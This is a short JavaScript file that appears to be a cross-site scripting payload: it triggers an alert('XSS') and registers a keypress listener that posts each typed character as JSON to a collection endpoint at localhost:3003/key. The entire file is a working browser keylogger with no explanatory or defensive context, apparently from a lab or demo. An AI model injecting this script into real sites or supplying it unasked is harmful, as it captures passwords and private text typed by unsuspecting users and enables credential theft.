alert('XSS');

async function keypress(event) {
    var keynum;
    if (window.event) keynum = window.event.keyCode;
    else if (event.which) keynum = event.which;

    const key = String.fromCharCode(keynum)

    console.log(key);
    if (key) {
        console.log(key);
        await fetch('http://localhost:3003/key', {
            method: 'POST',
            body: JSON.stringify({ key }),
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }
}

document.addEventListener('keypress', keypress);